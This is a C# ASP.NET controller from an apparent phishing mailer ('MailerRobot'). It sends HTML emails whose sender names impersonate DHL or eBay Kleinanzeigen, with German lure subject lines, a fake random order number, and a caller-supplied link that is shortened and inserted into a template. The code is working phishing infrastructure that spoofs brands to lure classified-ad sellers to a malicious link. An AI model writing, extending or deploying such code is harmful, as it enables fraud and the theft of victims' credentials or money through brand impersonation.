using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Mail;
using DteCrm.Services.EmailService;
using MailerRobot.Bot.Domain.Models;
using MailerRobot.Bot.Services;
using MediatR;
using Microsoft.AspNetCore.Mvc;
using FileIO = System.IO.File;

namespace MailerRobot.Controllers;

[ApiController]
[Route("/api/[controller]/[action]")]
public class SenderController : ControllerBase 
{
	private readonly IMediator _mediator;
	private readonly IConfiguration _configuration;

	public SenderController(IMediator mediator, IConfiguration configuration)
	{
		_mediator = mediator;
		_configuration = configuration;
	}

	[HttpGet]
	public async Task<IActionResult> Email(string email, string link, ServiceType serviceType)
	{
		var config = new EmailSendingConfiguration();

		_configuration.GetSection("MailSettings")
					.GetChildren()
					.First(e => e.Key == "Smtp2")
					.Bind(config);
		
		var smtpServer = config.Host;
		var smtpPort = config.Port;
		var smtpClient = new SmtpClient(smtpServer, smtpPort);

		var smtpUsername = config.User;
		var smtpPassword = config.Password;
		
		smtpClient.Credentials = new NetworkCredential(smtpUsername, smtpPassword);
		smtpClient.EnableSsl = true;

		var senderEmail = config.User;
		var recipientEmail = email;
		var subject = "";

		var orderNumber = Random.Shared.Next(234422000, 234522847);
		
		var body = await GetBody(link, serviceType);

		var message = new MailMessage(senderEmail, recipientEmail, subject, body);
		message.IsBodyHtml = true;
		
		if (serviceType == ServiceType.DHL)
		{
			message.Subject = $"Unser Team hat einen Kunden für Sie gefunden #{orderNumber}";
			
			message.From = new MailAddress(senderEmail, "•DHL•Lieferungen");
		}
		else
		{
			message.Subject = "Nutzer-Anfrage zu deiner Anzeige!";
			message.From = new MailAddress(senderEmail, "EBAY_Kleinanzeigen");
		}

		try
		{
			smtpClient.Send(message);


			return Ok();
		}
		catch (Exception e)
		{
			return BadRequest();
		}
	}

	private async Task<string> GetBody(string link, ServiceType serviceType)
	{
		var shortLinkRequest = new GetShortLinkRequest(link);

		var shortLink = await _mediator.Send(shortLinkRequest);

		var path = $@"C:\\Users\\Admin\\RiderProjects\\MailerRobot\\MailerRobot\\Bot\\Templates\\{serviceType}.html";
		
		var hmtlBody = FileIO.ReadAllText(path)
							.Replace("PutYourLinkHere", shortLink);

		return hmtlBody;
	}
}